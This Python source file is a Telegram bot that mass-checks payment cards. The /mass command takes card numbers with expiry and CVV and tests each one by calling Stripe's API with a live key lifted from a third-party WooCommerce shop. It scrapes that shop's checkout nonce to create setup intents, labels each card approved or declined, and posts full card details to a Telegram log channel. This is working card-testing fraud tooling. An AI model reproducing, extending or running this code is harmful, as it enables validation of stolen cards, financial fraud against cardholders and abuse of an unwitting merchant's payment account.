import requests
import re
from bs4 import BeautifulSoup
from urllib.parse import urlencode
import json
import os
import time
import logging
import threading
import asyncio
import signal
import sys
from concurrent.futures import ThreadPoolExecutor
from telegram import Update, Bot
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import concurrent.futures
from datetime import datetime

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('bot.log')
    ]
)
logger = logging.getLogger(__name__)

# Get bot token and log channel from environment variables
BOT_TOKEN = os.getenv('BOT_TOKEN')
LOG_CHANNEL_ID = os.getenv('LOG_CHANNEL_ID')  # Add this to your environment variables

if not BOT_TOKEN:
    logger.error("BOT_TOKEN environment variable not set!")
    sys.exit(1)

if not LOG_CHANNEL_ID:
    logger.warning("LOG_CHANNEL_ID not set. Logging to channel disabled.")

# Global application instance for graceful shutdown
app = None
file_lock = threading.Lock()

# Function to chunk large messages for Telegram's limits
def chunk_message(message, max_length=4000):
    if len(message) <= max_length:
        return [message]

    chunks = []
    while message:
        if len(message) <= max_length:
            chunks.append(message)
            break

        # Find a good breaking point
        split_point = message.rfind('\n', 0, max_length)
        if split_point == -1:
            split_point = max_length

        chunks.append(message[:split_point])
        message = message[split_point:].lstrip()

    return chunks

# Log channel functionality
async def log_to_channel(message: str, bot: Bot = None):
    """Send log message to the designated log channel"""
    if not LOG_CHANNEL_ID or not bot:
        return

    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        formatted_message = f"🕐 {timestamp}\n{message}"

        await bot.send_message(
            chat_id=LOG_CHANNEL_ID,
            text=formatted_message,
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Failed to send log to channel: {e}")

async def log_user_interaction(update: Update, action: str, details: str = ""):
    """Log user interactions to the channel"""
    if not LOG_CHANNEL_ID:
        return

    user = update.effective_user
    chat = update.effective_chat

    log_message = f"""
📊 **USER INTERACTION LOG**

👤 **User:** {user.full_name} (@{user.username or 'No username'})
🆔 **User ID:** `{user.id}`
💬 **Chat:** {chat.title or 'Private Chat'} (`{chat.id}`)
🎯 **Action:** {action}
📝 **Details:** {details}
    """

    try:
        bot = update.get_bot()
        await log_to_channel(log_message, bot)
    except Exception as e:
        logger.error(f"Failed to log user interaction: {e}")

async def log_card_processing(card_data: str, result: dict, user_info: dict, bot: Bot):
    """Log card processing results to the channel"""
    if not LOG_CHANNEL_ID:
        return

    status_emoji = {
        'APPROVED': '✅',
        'DECLINED': '❌',
        'ERROR': '⚠️',
        'UNKNOWN': '❓'
    }

    emoji = status_emoji.get(result['status'], '❓')

    log_message = f"""
💳 **CARD PROCESSING LOG**

👤 **User:** {user_info.get('name', 'Unknown')} (@{user_info.get('username', 'No username')})
🆔 **User ID:** `{user_info.get('id', 'Unknown')}`
💳 **Card:** `{card_data}`
{emoji} **Result:** {result['status']}
📝 **Message:** {result.get('message', 'No message')}
⏱️ **Processing Time:** {result.get('time', 'Unknown')}s
    """

    await log_to_channel(log_message, bot)

async def log_system_event(event_type: str, details: str, bot: Bot = None):
    """Log system events to the channel"""
    if not LOG_CHANNEL_ID:
        return

    log_message = f"""
🔧 **SYSTEM EVENT LOG**

📋 **Event Type:** {event_type}
📝 **Details:** {details}
    """

    if bot:
        await log_to_channel(log_message, bot)

async def log_mass_check_results(approved_cards, declined_cards, error_cards, user_info, bot):
    """Log the results of a mass check operation to the log channel"""

    # First, log the summary
    summary = f"User {user_info.get('name', 'Unknown')} completed mass check: {len(approved_cards)} approved, {len(declined_cards)} declined, {len(error_cards)} errors"
    await log_system_event("MASSCHECKCOMPLETE", summary, bot)

    # Log approved cards
    if approved_cards:
        approved_text = "✅ **APPROVED CARDS:**\n\n"
        for card, result in approved_cards:
            approved_text += f"💳 `{card}`\n✅ **APPROVED** - {result['message']}\n⏱️ Time: {result['time']}s\n\n"

        for chunk in chunk_message(approved_text):
            await log_to_channel(chunk, bot)

    # Log declined cards
    if declined_cards:
        declined_text = "❌ **DECLINED CARDS:**\n\n"
        for card, result in declined_cards:
            declined_text += f"💳 `{card}`\n❌ **DECLINED** - {result['message']}\n⏱️ Time: {result['time']}s\n\n"

        for chunk in chunk_message(declined_text):
            await log_to_channel(chunk, bot)

    # Log error cards
    if error_cards:
        error_text = "⚠️ **ERROR CARDS:**\n\n"
        for card, result in error_cards:
            error_text += f"💳 `{card}`\n⚠️ **ERROR** - {result['message']}\n⏱️ Time: {result['time']}s\n\n"

        for chunk in chunk_message(error_text):
            await log_to_channel(chunk, bot)

def extract_nonce(response_text, url):
    soup = BeautifulSoup(response_text, 'html.parser')
    checkout_nonce = soup.find('input', {'name': 'woocommerce-process-checkout-nonce'})
    if checkout_nonce:
        return checkout_nonce['value']

    stripe_nonce_match = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', response_text)
    if stripe_nonce_match:
        return stripe_nonce_match.group(1)

    script_nonce_match = re.search(r'"nonce":"([^"]+)"', response_text)
    if script_nonce_match:
        return script_nonce_match.group(1)

    raise ValueError(f"Could not find any nonce on {url}")

def create_payment_method(cc, m, y, cvv):
    url = "https://api.stripe.com/v1/payment_methods"
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-IN',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
    }

    data = {
        'type': 'card',
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_year]': y,
        'card[exp_month]': m,
        'allow_redisplay': 'unspecified',
        'billing_details[address][country]': 'IN',
        'payment_user_agent': 'stripe.js/2b425ea933; stripe-js-v3/2b425ea933; payment-element; deferred-intent',
        'referrer': 'https://radio-tecs.com',
        'time_on_page': '57018',
        'client_attribution_metadata[client_session_id]': 'a05ac5c7-6aaa-4abd-9ac7-8b5ab40ebd1b',
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
        'client_attribution_metadata[merchant_integration_version]': '2021',
        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
        'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
        'guid': '205dda56-6eb9-46f4-8609-e3addd479f0c177bc7',
        'muid': 'ebfc2dae-07ec-48dc-a474-5de8f917b8aa7b2f88',
        'sid': 'd158565f-7ea3-46e9-8587-cef28ce35fab191ba2',
        'key': 'pk_live_51JRJFgJNjZL6EJkQHeYkzBEpfeXNg9qADJwvdvXWpA3a2Dzl6TXIQwOLC3dyb56lGKSPNm8a0nTL8PlqFrHejIop00DUXcrpCK',
        '_stripe_version': '2024-06-20',
    }

    try:
        response = requests.post(url, headers=headers, data=data, timeout=30)
        if response.status_code == 200:
            return response.json().get('id')
        else:
            return None
    except Exception as e:
        logger.error(f"Payment method creation error: {e}")
        return None

def create_setup_intent(payment_method_id, cc):
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    })

    checkout_url = "https://radio-tecs.com/checkout/"
    try:
        response = session.get(checkout_url, timeout=30)
        response.raise_for_status()
        nonce = extract_nonce(response.text, checkout_url)
    except Exception as e:
        logger.error(f"Checkout page error: {e}")
        return None

    url = "https://radio-tecs.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
    data = {
        "action": "create_and_confirm_setup_intent",
        "wc-stripe-payment-method": payment_method_id,
        "wc-stripe-payment-type": "card",
        "_ajax_nonce": nonce,
    }

    try:
        response = session.post(
            url,
            data=urlencode(data),
            headers={"Referer": checkout_url},
            timeout=30
        )

        if response.status_code == 200:
            try:
                return response.json()
            except ValueError:
                return None
        else:
            return None

    except requests.exceptions.RequestException as e:
        logger.error(f"Setup intent error: {e}")
        return None

def process_cc(ccc):
    start_time = time.time()
    try:
        cc, m, y, cvv = ccc.split("|")
        y = y.replace("20", "") if y.startswith("20") else y

        payment_method_id = create_payment_method(cc, m, y, cvv)
        if not payment_method_id:
            timer = round(time.time() - start_time, 1)
            return {
                'status': 'DECLINED',
                'message': "Payment method creation failed",
                'card': ccc,
                'time': timer
            }

        result = create_setup_intent(payment_method_id, cc)
        if not result:
            timer = round(time.time() - start_time, 1)
            return {
                'status': 'DECLINED',
                'message': "Setup intent creation failed",
                'card': ccc,
                'time': timer
            }

        # Check for approval or specific errors
        if result.get('success') and 'setup_intent' in result:
            setup_intent = result['setup_intent']
            if setup_intent.get('status') == 'succeeded':
                timer = round(time.time() - start_time, 1)
                return {
                    'status': 'APPROVED',
                    'message': "Card successfully verified",
                    'card': ccc,
                    'time': timer
                }
            elif 'last_setup_error' in setup_intent and setup_intent['last_setup_error']:
                error_message = setup_intent['last_setup_error'].get('message', 'Unknown error')
                timer = round(time.time() - start_time, 1)
                return {
                    'status': 'DECLINED',
                    'message': error_message,
                    'card': ccc,
                    'time': timer
                }

        # Default decline if no specific condition met
        timer = round(time.time() - start_time, 1)
        return {
            'status': 'DECLINED',
            'message': "General processing failure",
            'card': ccc,
            'time': timer
        }

    except Exception as e:
        timer = round(time.time() - start_time, 1)
        return {
            'status': 'ERROR',
            'message': str(e),
            'card': ccc,
            'time': timer
        }

async def cmd_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process multiple cards at once and log the results"""
    user = update.effective_user
    user_info = {
        'id': user.id,
        'name': user.full_name,
        'username': user.username
    }

    # Check if the user provided cards
    if not context.args and not update.message.reply_to_message:
        await update.message.reply_text("Please provide cards or reply to a message containing cards.")
        return

    # Get cards from args or replied message
    if context.args:
        cards_text = ' '.join(context.args)
    else:
        cards_text = update.message.reply_to_message.text

    # Split into individual cards
    cards = [card.strip() for card in cards_text.split('\n') if card.strip()]

    if not cards:
        await update.message.reply_text("No valid cards found.")
        return

    # Inform user that processing has started
    processing_msg = await update.message.reply_text(f"Processing {len(cards)} cards. Please wait...")

    # Log user interaction
    await log_user_interaction(update, "Mass Check", f"Submitted {len(cards)} cards for checking")

    # Initialize lists to store results by category
    approved_cards = []
    declined_cards = []
    error_cards = []

    # Process each card
    for card in cards:
        card = card.strip()
        if not card or '|' not in card:
            continue

        try:
            result = process_cc(card)

            if result['status'] == 'APPROVED':
                approved_cards.append((card, result))
            elif result['status'] == 'DECLINED':
                declined_cards.append((card, result))
            else:
                error_cards.append((card, result))

        except Exception as e:
            logger.error(f"Error processing card {card}: {str(e)}")
            error_cards.append((card, {
                'status': 'ERROR',
                'message': str(e),
                'card': card,
                'time': 0.0
            }))

    # Log detailed results to the log channel
    await log_mass_check_results(
        approved_cards,
        declined_cards,
        error_cards,
        user_info,
        context.bot
    )

    # Update the user with a summary
    await processing_msg.edit_text(
        f"Mass check completed:\n"
        f"✅ Approved: {len(approved_cards)}\n"
        f"❌ Declined: {len(declined_cards)}\n"
        f"⚠️ Errors: {len(error_cards)}"
    )

# Initialize and run the bot
async def main():
    global app
    app = Application.builder().token(BOT_TOKEN).build()

    # Command handlers
    app.add_handler(CommandHandler("mass", cmd_mass))

    # Add other command handlers as needed...

    # Start the bot
    await app.start()
    logger.info("Bot started")

    # Run the bot until user interrupts
    await app.updater.start_polling()

    # Keep the bot running
    try:
        await asyncio.Future()
    finally:
        await app.stop()

# Graceful shutdown handler
def signal_handler(sig, frame):
    logger.info("Received signal to terminate. Shutting down gracefully...")
    if app:
        asyncio.run(app.stop())
    sys.exit(0)

# Register signal handlers
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

if __name__ == "__main__":
    asyncio.run(main())
